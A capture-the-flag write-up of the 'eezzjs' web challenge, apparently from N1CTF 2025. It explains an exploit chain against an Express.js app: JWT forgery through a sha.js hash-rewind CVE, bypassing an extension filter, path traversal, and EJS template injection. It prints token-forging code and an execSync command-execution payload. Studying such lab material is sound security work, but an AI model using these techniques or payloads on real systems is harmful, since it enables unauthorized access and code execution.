+++
type               = "ctf"
title              = "eezzjs"
description        = "Exploiting a bad JWT implementation and bypassing path.extname to get RCE"
author             = "conflict, siefr3dus"
date               = "2025-10-02"
language           = "en"
tags               = ["web", "web-server", "js", "rce", "jwt"]
event              = "N1CTF 2025"
difficulty         = "medium"
category           = "web"
solves             = ?
challenge_author   = "GSBP"
challenge_author_url = "https://gsbp0.github.io/"
rating             = 7
+++

## Introduction

This challenge was a joint solve between [conflict](https://cnf409.me/) and [siefr3dus](https://lucashanson.fr/).

**eezzjs** was a web challenge from n1CTF 2025. 

It was an Express.js challenge where the aim was to get remote code execution using EJS template rendering.

---

## TL;DR

The challenge involved chaining multiple vulnerabilities to achieve remote code execution:

1. Exploiting CVE-2025-9288 in sha.js to forge a valid JWT token for admin authentication
2. Bypassing the file extension filter using path normalization quirks
3. Leveraging a path traversal vulnerability to upload a malicious EJS template to the views directory
4. Triggering template rendering via a hidden query parameter to execute arbitrary commands

---

## Challenge Overview

The application contains a file upload functionality, which is locked behind an authentication middleware.

```jsx
app.post('/upload', authenticateJWT, uploadFile);
```

There was no way of creating our own account, and by default an admin account was initialized using a random password.

---

## Vulnerability Identification

### JWT Forgery via SHA.JS CVE

We needed to create a valid JWT token so we could be authenticated as the admin, and therefore access the upload endpoint. Our `authenticateJWT` middleware calls the `verifyJWT` function.

```jsx
const verifyJWT = (token, secret = JWT_SECRET) => {
    if (typeof token !== 'string') {
        return null;
    }
    const parts = token.split('.');
    if (parts.length !== 3) {
        return null;
    }
    const [encodedHeader, encodedPayload, signature] = parts;
    let header;
    let payload;
    try {
        header = JSON.parse(fromBase64Url(encodedHeader).toString());
        payload = JSON.parse(fromBase64Url(encodedPayload).toString());
    } catch (err) {
        return null;
    }
    const expectedSignatureHex = sha256(...[JSON.stringify(header), payload, secret]);
    let providedSignature;
    let expectedSignature;
    try {
        providedSignature = Buffer.from(signature, 'hex');
        expectedSignature = Buffer.from(expectedSignatureHex, 'hex');
    } catch (err) {
        return null;
    }
    if (
        providedSignature.length !== expectedSignature.length ||
        !crypto.timingSafeEqual(providedSignature, expectedSignature)
    ) {
        return null;
    }
    if (header.alg !== 'HS256') {
        return null;
    }
    if (payload.exp && Math.floor(Date.now() / 1000) >= payload.exp) {
        return null;
    }
    return payload;
};
```

What interests us here is this specific line: 

`const expectedSignatureHex = sha256(...[JSON.stringify(header), payload, secret]);` 

which uses an outdated version of sha.js `"sha.js": "2.4.10"`.

This version is vulnerable to a hash rewind attack, specifically [CVE-2025-9288](https://github.com/advisories/GHSA-95m3-7q98-8xr5), which will allow us to control the output of the sha256 function:

```jsx
const sha256 = (...messages) => {
    const hash = sha('sha256');
    messages.forEach((m) => hash.update(m));
    return hash.digest('hex');
};
```

As the payload variable being passed to this line 

`const expectedSignatureHex = sha256(...[JSON.stringify(header), payload, secret]);` is an object, we control its length as it is extracted directly from the JWT token.

We calculated that the combined length of header and secret came to 45 characters, therefore the length of our payload object needs to be **-45**. This way, we rewind 45 characters, essentially hashing an empty string.

This is essential because the JWT's signature is no longer a consequence of hashing the header, payload, and secret. This allows us to provide an arbitrary payload and still have the token be considered valid, because the signature check doesn't actually check the contents of the provided token.

---

### File Extension Filter Bypass

Once we managed to authenticate ourselves, we needed to bypass the extension check on the upload function. Our aim here is to upload an EJS template file, but this simple check stops any files being uploaded with an extension containing "js".

```jsx
var ext = path.extname(filename).toLowerCase();
if (/js/i.test(ext)) {
    return  res.status(403).send('Denied filename');
}
var filepath = path.join(uploadDir,filename);
```

As the view engine is specifically set to EJS, we can't use the trick of uploading for example a .pug template.

```jsx
app.set('view engine', 'ejs');
```

However there seems to be a slight quirk in the file extension check. The string that is being checked is not the same as the string that will be used for our file name. We can use this to our advantage.

**Key Observations:**

The first thing that we need to take into account is that `path.extname` uses whatever is after the last `/` as the filename that it will extract the extension from. This means that a path like `/tmp/test.ejs/.` will have an extension of `.`.

The second thing that we need to take into account, is that `path.join` normalizes any path passed to it, therefore removing any trailing dots or slashes.

**Bypass Technique:**

We now have everything that we need. We pass a filename of `payload.ejs/.`. The extension given by extname is `.`, which does not contain js, therefore passing our check. The path.join then normalizes the filename, giving us a final filename of `payload.ejs`.

---

### Path Traversal

Now that we can upload our EJS template, we need to store it in the correct directory, so that we can execute it.

The file upload function contains a simple path traversal, meaning we can simply input a relative path and place our file in the views directory.

```jsx
function uploadFile(req, res) {
    var {filedata,filename}=req.body;
    var ext = path.extname(filename).toLowerCase();
    if (/js/i.test(ext)) {
        return  res.status(403).send('Denied filename');
    }
    var filepath = path.join(uploadDir,filename);
    if (fs.existsSync(filepath)) {
        return res.status(500).send('File already exists');
    }
    fs.writeFile(filepath, filedata, 'base64', (err) => {
        if (err) {
            console.log(err);
            res.status(500).send('Error saving file');
        } else {
            res.status(200).send({ message: 'File uploaded successfully', path: `/uploads/${path}` });
        }
    });
}
```

Our filename therefore looks like this: `../views/payload.ejs/.`

---

### Template Rendering Exploitation

The challenge creators were very kind, and gave us a function allowing us to execute any template that we like:

```jsx
function serveIndex(req, res) {
    var templ = req.query.templ || 'index';
    var lsPath = path.join(__dirname, req.path);
    try {
        res.render(templ, {
            filenames: fs.readdirSync(lsPath),
            path: req.path
        });
    } catch (e) {
        console.log(e);
        res.status(500).send('Error rendering page');
    }
}
```

We can see here that the `templ` parameter is directly rendered by the `res.render`.

---

## Exploitation

### Crafting the JWT Token

Here's our code allowing us to generate the token, which is just a modified version of the original signJWT function from the challenge.

```jsx
const signJWT = (payload, { expiresIn } = {}, secret = JWT_SECRET) => {
    console.log('Signing JWT with payload:', payload, 'expiresIn:', expiresIn);
    const header = { alg: 'HS256', typ: 'JWT' };
    const now = Math.floor(Date.now() / 1000);
    const body = { ...payload, length:-45,iat: now };
    if (expiresIn) {
        body.exp = now + expiresIn;
    }
    return [
        toBase64Url(JSON.stringify(header)),
        toBase64Url(JSON.stringify(body)),
        sha256(...[JSON.stringify(header), body, secret])
    ].join('.');
};
let jwt = signJWT({ username: 'admin' }, { expiresIn: 3600 });
console.log('Generated JWT:', jwt);
```

---

### Uploading the Malicious Template

We craft a malicious EJS payload containing our command execution code, encode it in base64, and upload it using our forged JWT token with the filename `../views/flag.ejs/.`.

---

### Triggering Code Execution

We simply upload our malicious payload 

`<%= global.process.mainModule.require('child_process').execSync('cat /flag').toString() %>` 

and trigger it by visiting `/?templ=flag.ejs` to get our flag.

---

## Conclusion

By combining a cryptographic vulnerability (SHA.JS hash rewind), path manipulation techniques (extension filter bypass and path traversal), and server-side template injection, we successfully achieved remote code execution and retrieved the flag.

Great challenge!
